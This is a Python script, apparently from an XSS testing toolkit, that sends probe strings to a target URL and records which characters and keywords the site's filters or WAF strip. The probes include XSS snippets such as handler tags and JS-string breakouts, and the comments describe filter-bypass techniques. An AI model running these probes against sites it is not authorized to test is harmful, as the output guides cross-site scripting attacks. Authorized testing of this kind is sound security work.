#!/usr/bin/env python3
import subprocess
import urllib.parse
import os
import re
import secrets
import string
import json
import argparse
import sys
import base64
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from log_utils import new_log_path

MARKER_START = "testing1"
MARKER_END = "testing2"
SEPARATOR = "x"          # legacy only — see make_boundaries()
PLACEHOLDER = "{xss_testing}"


def make_boundaries(items):
    """len(items)+1 indexed boundary tokens: b0 sits right after
    MARKER_START, b_i between item i-1 and item i, b_last right before
    MARKER_END — so every item incl. edge ones is cleanly delimited.
    Each token is 4 random letters + 2-digit index (uniform 6 chars,
    distinct by construction) and is CHECKED against every item and
    the markers, so a boundary can never collide with probe content —
    no item is ever restricted by the separator ('x' is no longer
    reserved). A filter eating one boundary only merges its two
    adjacent items; all other items stay individually readable."""
    vals = [v for _, v in items] + [MARKER_START, MARKER_END]
    seps = []
    for i in range(len(items) + 1):
        while True:
            b = "".join(secrets.choice(string.ascii_letters)
                        for _ in range(4)) + f"{i:02d}"
            if all(b not in v for v in vals):
                break
        seps.append(b)
    return seps

CHARACTERS = [
    ("single_quote", "'"),
    ("double_quote", '"'),
    ("greater_than", ">"),
    ("less_than", "<"),
    ("slash", "/"),
    ("backslash", "\\"),
]

# Layer B/C probe (--probe2): keyword-level filters the 6-char probe cannot see
KEYWORDS = [
    ("parentheses", "()"),
    ("backtick", "`"),
    ("alert", "alert"),
    ("confirm", "confirm"),
    ("prompt", "prompt"),
    ("script_tag", "<script>"),
    ("javascript_proto", "javascript:"),
    ("onerror", "onerror"),
    # tag probes carry '>': a whole-tag stripper (<img[^>]*>) deletes
    # complete tags while letting the bare '<img' name through
    ("img_tag", "<img>"),
    ("entity_lt", "&lt;"),
    # '&#101;' must return verbatim for the entity-encoded-fn bypass
    # (al&#101;rt): '&' -> '&amp;' or '#' stripped means char refs are
    # dead on arrival — skip that bypass path entirely.
    ("char_ref", "&#101;"),
    ("srcdoc", "srcdoc"),
    ("onload", "onload"),
    ("ontoggle", "ontoggle"),
    ("autofocus", "autofocus"),
    ("onfocus", "onfocus"),
    ("print", "print"),
    ("svg_tag", "<svg>"),
    ("details_tag", "<details>"),
    ("body_tag", "<body>"),
    ("iframe_tag", "<iframe>"),
    # junction probes: WAF signatures fire on combinations, not atoms
    ("call_alert", "alert(1)"),
    ("call_confirm", "confirm(1)"),
    ("call_prompt", "prompt(1)"),
    ("call_print", "print()"),
    ("tick_alert", "alert`1`"),
    ("tick_confirm", "confirm`1`"),
    ("tick_prompt", "prompt`1`"),
    ("pair_img_onerror", "img onerror"),
    ("pair_svg_onload", "svg onload"),
    ("pair_details_ontoggle", "details ontoggle"),
    ("pair_body_onload", "body onload"),
    ("pair_iframe_onload", "iframe onload"),
    ("close_script", "</script"),
    ("close_title", "</title"),
    ("close_textarea", "</textarea"),
    ("close_noscript", "</noscript"),
    ("close_style", "</style"),
    ("close_iframe", "</iframe"),
    ("js_break_squote", "'-alert(1)-"),
    ("js_break_dquote", "\"-alert(1)-"),
    ("proto_href", "href=javascript:"),
    # case-mutation probes: cheap WAFs sign lowercase only
    ("case_script", "ScRiPt"),
    ("case_onload", "OnLoAd"),
    ("case_proto", "JaVaScRiPt:"),
    # context-syntax probes for comment/template-literal escapes
    ("newline", "\n"),
    ("comment_close", "*/"),
    ("interp", "${"),
    # char-ref spelling variants: filters that sign '&#NNN;' miss
    # hex/padded/no-semicolon spellings of the same reference
    ("hex_ref", "&#x65;"),
    ("nosemi_ref", "&#x65"),
]


def random_tag_name():
    """3-letter random tag name for the generic tag-stripper probe."""
    return "".join(secrets.choice(string.ascii_letters) for _ in range(3))


def keyword_items():
    """KEYWORDS plus one random junk tag (e.g. <xDh>). If even this unknown
    tag is removed, the filter is a generic tag-stripper and ANY deleted
    string — including this random one — can be nested inside blocked
    content as a splitter (case: xss tag removed.md).

    The random tag is inserted BEFORE the first '<'-bearing item: denylist
    regexes such as /<script[^>]*>/ match forward to the next '>', so an
    unclosed item like '</script' would swallow the random tag into its
    match and it would report 'encoded' instead of 'removed'.

    gen_* items are generic-shape control probes: one benign random
    identifier tests whether the CALL/JUNCTION shape is blocked
    independent of any dangerous fn name. gen_call is the control — if
    it fails, every ()-bearing variant below is dead too. All probes
    carrying '>' must precede the first unclosed '</' item (a forward-
    matching stripper regex would swallow them into its match), so the
    block is inserted before close_script."""
    items = list(KEYWORDS)
    idx = next((i for i, (_, v) in enumerate(items) if "<" in v), len(items))
    items.insert(idx, ("rand_tag", f"<{random_tag_name()}>"))
    i = random_tag_name()
    gen = [
        ("gen_call", f"{i}()"),
        ("gen_tick", f"{i}`1`"),
        ("gen_script", f"<script>{i}()</script>"),
        ("gen_handler", f"<svg onload={i}()>"),
        ("gen_h_error", f"<img onerror={i}()>"),
        ("gen_jsurl", f"javascript:{i}()"),
        ("gen_break_squote", f"'-{i}()-'"),
        ("gen_break_dquote", f'"-{i}()-"'),
        # gen_bracket: generic self['x'+'y']() concat-call control —
        # '[' or ']' filtered kills every bracket-access payload.
        # gen_u6brace: raw '{...}' ES6 escape survives — a filter can
        # strip '{' while leaving a bare \ untouched.
        ("gen_bracket", "self['a'+'b']()"),
        ("gen_u6brace", "\\u{62}"),
    ]
    ci = next((n for n, (_, v) in enumerate(items) if v.startswith("</")),
              len(items))
    items[ci:ci] = gen
    return items


def send_curl(url):
    try:
        result = subprocess.run(
            ["curl", "-s", "-k", "--max-time", "10", url],
            capture_output=True,
            text=True,
        )
        return result.stdout
    except Exception as e:
        return f"[CURL_ERROR] {e}"


# Injected before any page script runs (add_init_script): record which DOM
# sinks receive what string, and which alert-family calls actually fire.
# __sinks captures the RAW sink argument — the honest post-decode value,
# free of DOM serialization artifacts (a '>' written into text re-saves
# as '&gt;' in innerHTML, but the sink arg keeps '>').
RENDER_HOOK_JS = """
window.__sinks = [];
window.__fired = [];
try {
  const rec = (n, a) => { try { window.__sinks.push([n, String(a).slice(0, 2000)]); } catch (e) {} };
  const _dw = document.write.bind(document);
  document.write = s => { rec("document.write", s); return _dw(s); };
  const _dwl = document.writeln.bind(document);
  document.writeln = s => { rec("document.writeln", s); return _dwl(s); };
  for (const [proto, prop, label] of [
      [Element.prototype, "innerHTML", "innerHTML"],
      [Element.prototype, "outerHTML", "outerHTML"],
      [HTMLIFrameElement.prototype, "srcdoc", "srcdoc"]]) {
    try {
      const d = Object.getOwnPropertyDescriptor(proto, prop);
      if (d && d.set) {
        Object.defineProperty(proto, prop, {
          configurable: true, enumerable: d.enumerable,
          get: d.get ? function () { return d.get.call(this); } : undefined,
          set: function (v) { rec(label, v); return d.set.call(this, v); }
        });
      }
    } catch (e) {}
  }
  try {
    const _iah = Element.prototype.insertAdjacentHTML;
    Element.prototype.insertAdjacentHTML = function (p, v) {
      rec("insertAdjacentHTML", v); return _iah.call(this, p, v);
    };
  } catch (e) {}
  try {
    const _rcf = Range.prototype.createContextualFragment;
    Range.prototype.createContextualFragment = function (v) {
      rec("createContextualFragment", v); return _rcf.call(this, v);
    };
  } catch (e) {}
  try {
    const _sa = Element.prototype.setAttribute;
    Element.prototype.setAttribute = function (n, v) {
      if (/^on/i.test(String(n))) rec("setAttribute:" + n, v);
      return _sa.call(this, n, v);
    };
  } catch (e) {}
  const _ev = window.eval;
  window.eval = s => { rec("eval", s); return _ev(s); };
  for (const t of ["setTimeout", "setInterval"]) {
    try {
      const orig = window[t];
      window[t] = (f, ms, ...r) => typeof f === "string"
        ? (rec(t + "(string)", f), orig(f, ms, ...r)) : orig(f, ms, ...r);
    } catch (e) {}
  }
  try {
    const _Fn = window.Function;
    window.Function = function (...a) {
      rec("Function", a.join(";")); return _Fn.apply(this, a);
    };
    window.Function.prototype = _Fn.prototype;
  } catch (e) {}
  for (const t of ["assign", "replace"]) {
    try {
      const orig = location[t].bind(location);
      location[t] = u => { rec("location." + t, u); return orig(u); };
    } catch (e) {}
  }
  try {
    const _wo = window.open;
    window.open = (u, n, f) => { rec("window.open", u); return _wo(u, n, f); };
  } catch (e) {}
  for (const n of ["alert", "confirm", "prompt", "print"]) {
    window[n] = a => { window.__fired.push(n + "(" + String(a === undefined ? "" : a) + ")"); return true; };
  }
} catch (e) {}
"""


def fetch_rendered(url, timeout_ms=15000):
    """Render url in headless chromium; return (serialized_dom, meta).

    meta = {"sinks": [[sink_name, raw_arg], ...], "fired": [alert(1), ...]}
    Requires playwright + a chromium build (`playwright install chromium`).
    """
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        try:
            page = browser.new_page()
            page.add_init_script(RENDER_HOOK_JS)
            page.goto(url, timeout=timeout_ms)
            page.wait_for_timeout(500)  # let deferred/async sinks fire
            html = page.content()
            meta = page.evaluate(
                "({sinks: window.__sinks || [], fired: window.__fired || []})")
        finally:
            browser.close()
    return html, meta


def send_probe(target_url, items, vuln_name, kind, render=False):
    seps = make_boundaries(items)
    input_str = (MARKER_START
                 + "".join(seps[i] + v for i, (_, v) in enumerate(items))
                 + seps[-1] + MARKER_END)
    print(f"{kind}: {input_str}")
    encoded = urllib.parse.quote(input_str, safe="")
    url = target_url.replace(PLACEHOLDER, encoded)
    print(f"URL:   {url}")
    rmeta = {"sinks": [], "fired": []}
    if render:
        try:
            response, rmeta = fetch_rendered(url)
        except Exception as e:
            print(f"[RENDER_ERROR] {e}")
            print("hint: pip install playwright && playwright install chromium")
            return
        print(f"Rendered DOM: {len(response)} chars | "
              f"sinks: {sorted({n for n, _ in rmeta['sinks']}) or 'none'} | "
              f"fired: {rmeta['fired'] or 'none'}")
    else:
        response = send_curl(url)
        print(f"Response length: {len(response)}")

    html_file = new_log_path(vuln_name, "html")
    with open(html_file, "w") as f:
        f.write(f"<!-- generated_by: send_payloads.py -->\n")
        f.write(f"<!-- generated_at: {datetime.now().isoformat()} -->\n")
        f.write(f"<!-- probe_mode: {'render' if render else 'curl'} -->\n")
        f.write(f"<!-- input_sent: {input_str} -->\n")
        f.write(f"<!-- separator: indexed -->\n")
        f.write(f"<!-- seps_json: {json.dumps(seps)} -->\n")
        f.write(f"<!-- items_json: {json.dumps(items)} -->\n")
        f.write(f"<!-- {kind.lower()}_names: {', '.join(n for n, _ in items)} -->\n")
        f.write(f"<!-- url: {url} -->\n")
        f.write(f"<!-- response_length: {len(response)} -->\n")
        if render:
            sinks_b64 = base64.b64encode(
                json.dumps(rmeta["sinks"]).encode()).decode()
            f.write(f"<!-- sinks_b64: {sinks_b64} -->\n")
            f.write(f"<!-- fired_json: {json.dumps(rmeta['fired'])} -->\n")
        f.write(response)
    print(f"Saved: {html_file}\n")


def isolate_probe(target_url):
    """Escalation probe: send each character alone (testing1<c>testing2).
    Used when the combined probe shows an anomaly (no marker back, all
    FAIL, or split collapse) to pinpoint which single char triggers the
    filter. No separator parsing needed — verdict = exact marker match."""
    print("Isolation mode: one request per character")
    results = []
    for name, char in CHARACTERS:
        probe = MARKER_START + char + MARKER_END
        url = target_url.replace(PLACEHOLDER, urllib.parse.quote(probe, safe=""))
        response = send_curl(url)
        reflected_ok = probe in response
        m = re.search(re.escape(MARKER_START) + r"(.{0,100}?)" + re.escape(MARKER_END),
                      response, re.DOTALL)
        got = m.group(1) if m else None
        # verdict: char untouched if exact probe reflected; transformed if
        # markers present but middle differs; rejected if markers absent
        if reflected_ok:
            verdict, status = "unchanged", 100
        elif got is not None:
            verdict, status = "transformed", 50
        else:
            verdict, status = "rejected", 0
        results.append({"character_name": name, "character": char,
                        "reflected": got, "verdict": verdict, "score": status})
        print(f"  {name:<15} {char!r:<6} -> {verdict} (got: {got!r})")

    out_file = new_log_path("xss_isolation", "json")
    with open(out_file, "w") as f:
        json.dump({
            "generated_by": "send_payloads.py --isolate",
            "generated_at": datetime.now().isoformat(),
            "url": target_url,
            "results": results,
        }, f, indent=2, ensure_ascii=False)
    print(f"Saved: {out_file}\n")


def main():
    parser = argparse.ArgumentParser(description="Send XSS test payloads to a target URL")
    parser.add_argument("--url", required=True, help=f'Target URL with {PLACEHOLDER} placeholder (example: --url="https://example.com/search?q={PLACEHOLDER}")')
    parser.add_argument("--probe2", action="store_true",
                        help="also send the Layer B/C keyword-mask probe "
                             "(), `, alert, <script>, javascript:, onerror, <img "
                             "plus a random <xYz> junk tag (generic "
                             "tag-stripper detector) "
                             "(saved as *-xss_keywords.html)")
    parser.add_argument("--isolate", action="store_true",
                        help="escalation probe: send each character alone "
                             "testing1<c>testing2 to pinpoint which char trips "
                             "the filter (saved as *-xss_isolation.json)")
    parser.add_argument("--render", action="store_true",
                        help="fetch via headless chromium instead of curl: "
                             "finds DOM-only sinks (document.write, innerHTML, "
                             "eval) whose reflection never reaches the raw "
                             "response; hooked sinks are recorded in the log")
    args = parser.parse_args()

    target_url = args.url

    if PLACEHOLDER not in target_url:
        print(f"Error: URL must contain {PLACEHOLDER} placeholder")
        print(f'Example: --url="https://example.com/search?q={PLACEHOLDER}"')
        return

    if args.isolate:
        isolate_probe(target_url)
        return

    kw_items = keyword_items() if args.probe2 else []

    print("=" * 80)
    print("Send Payloads")
    print(f"Target: {target_url}")
    print(f"Date: {datetime.now().isoformat()}")
    print(f"Characters: {', '.join(name for name, _ in CHARACTERS)}")
    if args.probe2:
        print(f"Keywords:  {', '.join(name for name, _ in kw_items)}")
    print("=" * 80)
    print()

    # Probe 1: character fingerprint (Layer A) -> *-xss.html
    send_probe(target_url, CHARACTERS, "xss", "Characters", render=args.render)

    # Probe 2: keyword fingerprint (Layer B/C) -> *-xss_keywords.html
    if args.probe2:
        send_probe(target_url, kw_items, "xss_keywords", "Keywords", render=args.render)


if __name__ == "__main__":
    main()
